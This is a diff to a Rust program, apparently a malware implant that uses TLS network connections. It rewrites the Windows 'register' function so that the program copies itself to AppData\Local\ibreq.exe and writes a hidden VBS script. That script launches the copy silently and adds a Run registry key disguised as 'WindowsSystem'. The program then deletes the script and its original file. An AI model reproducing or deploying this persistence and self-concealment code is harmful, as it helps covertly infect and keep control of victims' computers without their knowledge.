@@ -2,8 +2,7 @@ use core::str::FromStr;
 use native_tls::{TlsConnector, TlsStream};
 use rand::Rng;
 use std::{
-  collections::HashMap, error, io::Read, io::Result as IResult, io::Write, net::TcpStream,
-  path::PathBuf, process::Command,
+  collections::HashMap, env, error, fs, io::Read, io::Result as IResult, io::Write, net::TcpStream, process::{Command, exit}
 };
 
 static BODY_SEPARATOR: &str = "\r\n\r\n";
@@ -160,41 +159,31 @@ pub fn register() {
 
 #[cfg(target_os = "windows")]
 pub fn register() {
-  // cp CURRENT_PATH_HERE C:\Windows\system.exe
-  // REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WindowsSystem" /t REG_SZ /F /D "C:\Windows\system.exe"
-
+  let home_path = env::home_dir().unwrap().display().to_string();
   let current_path = std::env::current_exe().unwrap().display().to_string();
+  let target_path = home_path.clone() + "\\AppData\\Local\\ibreq.exe";
+  let vbs_path = home_path.clone() + "\\AppData\\Local\\ibreq.vbs";
 
-  Command::new("cmd")
-    .args(&[
-      "cp",
-      &current_path,
-      &PathBuf::from("C:\\Windows\\system.exe")
-        .display()
-        .to_string(),
-    ])
-    .output()
-    .unwrap();
+  if current_path == target_path {
+    return;
+  }
 
-  Command::new("cmd")
-    .args(&[
-      "REG",
-      "ADD",
-      &PathBuf::from("HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")
-        .display()
-        .to_string(),
-      "/V",
-      "WindowsSystem",
-      "/t",
-      "REG_SZ",
-      "/F",
-      "/D",
-      &PathBuf::from("C:\\Windows\\system.exe")
-        .display()
-        .to_string(),
-    ])
-    .output()
-    .unwrap();
+  fs::copy(&current_path, &target_path).unwrap();
+
+  let vbs_content = format!(r#"
+    Set oShell = CreateObject("Wscript.Shell")
+    oShell.Run "cmd /c {target_path}", 0, false
+    oShell.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsSystem","{target_path}","REG_SZ"
+  "#, target_path = target_path);
+
+  fs::write(&vbs_path, &vbs_content).unwrap();
+
+  Command::new("wscript").arg(&vbs_path).output().unwrap();
+
+  fs::remove_file(&vbs_path).unwrap();
+  fs::remove_file(&current_path).unwrap();
+
+  exit(0);
 }
 
 #[cfg(target_os = "linux")]
